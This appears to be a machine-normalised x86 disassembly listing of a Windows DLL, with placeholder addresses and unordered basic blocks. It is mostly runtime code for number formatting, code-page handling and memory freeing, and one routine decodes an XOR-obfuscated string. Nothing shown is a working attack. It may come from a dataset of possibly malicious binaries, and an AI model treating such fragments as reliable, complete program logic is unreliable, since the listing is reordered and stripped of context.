cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_10021026
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001af63
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_1006299d
mov [ eax ] edi
call sub_100427ff
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1001dbcd
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10082cb2
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10082e13
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_10021113
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] cl
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
push r--data
mov [ ecx ] eax
mov [ ecx + 0x4 ] al
call sub_1004ed30
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10021152
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10080b27
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10080933
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1007f940
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10080904
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_10080997
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1007f940
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10080904
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10021340
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1006a0d0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10021370
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_1007ec90
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_100213f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_100680b6
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_100680b6
pop ecx
pop ecx
mov ecx esi
sub ecx eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test ecx ecx
setns al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
sub_10021470
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea esp [ esp ]
mov edx [ esi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop ebx
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x10 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x50 ] 0x0
je r-xdata
push eax
call ebx
cmp [ edi + 0x54 ] 0x0
lea esi [ edi + 0x54 ]
je r-xdata
mov [ edi + 0x50 ] 0x0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ ebp + 0x8 ]
call sub_10005d80
sub_10021530
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff99
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x5c ]
push edx
mov ecx esi
call sub_1005ddc0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_1001a2f0
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10021622
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004883d
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
sub_10021693
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001af63
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_1006299d
mov [ eax ] ebx
call sub_100427ff
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10082cb2
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_1001dbcd
add esp 0x10
test eax eax
je r-xdata
sub_10021760
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x24
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_1002178c
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_10022fe3
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_10022fe3
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_10021850
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_10041c50
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_10028360
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
